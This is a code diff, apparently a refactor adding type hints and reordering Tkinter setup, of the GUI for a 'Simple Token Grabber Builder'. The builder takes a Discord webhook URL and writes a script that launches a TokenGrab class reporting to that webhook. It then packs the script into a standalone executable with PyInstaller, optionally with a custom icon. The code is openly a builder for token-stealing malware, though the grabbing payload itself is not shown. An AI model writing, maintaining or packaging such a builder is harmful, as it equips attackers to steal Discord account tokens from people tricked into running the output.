@@ -8,20 +8,19 @@ import os
 
 USE_ICON = False
 
-def builder(webhook):
+def builder(webhook: str) ->bool:
     if 'https://discord.com/api/webhooks/' in webhook:
         showinfo('Message',f'Building {webhook}')
         with open('built.py', 'w', encoding='UTF-8') as f:
             f.write('from src import TokenGrab\n')
             f.write(f'TokenGrab("{webhook}").start()\n')
             return True
-
     else:
         showerror('Error', 'That is not a webhook link!')
 
     return False
 
-def pack(path):
+def pack(path: str):
     if USE_ICON:
         print('Adding icon to exe file')
         p = Popen(f'pyinstaller --noconfirm --onefile --console --icon "{USE_ICON}"  "{path}"', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
@@ -35,11 +34,14 @@ def pack(path):
 def main():
     global USE_ICON
 
-    def t_webhook():
+    anim = None
+    count = 0
+
+    def t_webhook() -> None:
         t1 = threading.Thread(target=get_webhook, daemon= True)
         t1.start()
 
-    def get_webhook():
+    def get_webhook() -> None:
         gif_label.grid(column= 1, row= 3)
         webhook = webhook_input.get()
         text1 = tk.Label(root, text= 'Building .py file. Please wait.', font=('Raleway',7))
@@ -68,27 +70,12 @@ def main():
             text1.config(text="Unable to build .py file.")
             gif_label.grid_forget()
 
-    def add_icon():
+    def add_icon() -> None:
         global USE_ICON
         icon_path = filedialog.askopenfilename()
         USE_ICON = icon_path
 
-    root = tk.Tk()
-    root.iconbitmap('assets/icon.ico')
-    root.title('Simple Token Grabber Builder')
-
-    # GIF ######
-    file="assets/load.gif"
-
-    info = Image.open(file)
-
-    frames = info.n_frames  
-
-    im = [tk.PhotoImage(file=file,format=f"gif -index {i}") for i in range(frames)]
-    count = 0
-    anim = None
-
-    def animation(count):
+    def animation(count: int) -> None:
         global anim
         im2 = im[count]
 
@@ -99,14 +86,26 @@ def main():
 
         anim = root.after(50,lambda :animation(count))
 
+    root = tk.Tk()
+    root.iconbitmap('assets/icon.ico')
+    root.title('Simple Token Grabber Builder')
+
+    # GIF 
+    file="assets/load.gif"
+    info = Image.open(file)
+    frames = info.n_frames  
+
+    im = [tk.PhotoImage(file=file,format=f"gif -index {i}") for i in range(frames)]
+
     gif_label = tk.Label(root,image="")
 
     #gif_label.grid(column= 1, row= 3)
     #gif_label.grid_forget()
-    ## GIF ####
+    # GIF END
+     
     animation(count)
 
-    canvas = tk.Canvas(root, width= 600, height=150) #height 200
+    canvas = tk.Canvas(root, width= 600, height=150) 
     canvas.grid(columnspan = 3)
 
     logo = Image.open('assets/logo.png')
